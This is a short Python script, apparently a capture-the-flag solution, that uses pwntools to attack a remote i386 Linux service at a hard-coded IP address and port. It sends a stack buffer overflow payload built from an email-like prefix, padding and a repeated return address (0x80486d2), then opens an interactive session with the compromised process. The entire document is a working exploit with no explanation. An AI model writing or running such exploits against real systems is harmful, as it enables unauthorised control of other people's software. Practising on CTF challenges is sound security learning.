from pwn import *
context(arch="i386",os="linux")
p=remote("159.138.137.79","53148")
p.sendlineafter("name?","test")
payload="a@a."+"a"*(0x20-4)+p32(0x80486d2)*10
p.sendlineafter("validate",payload)
p.interactive()
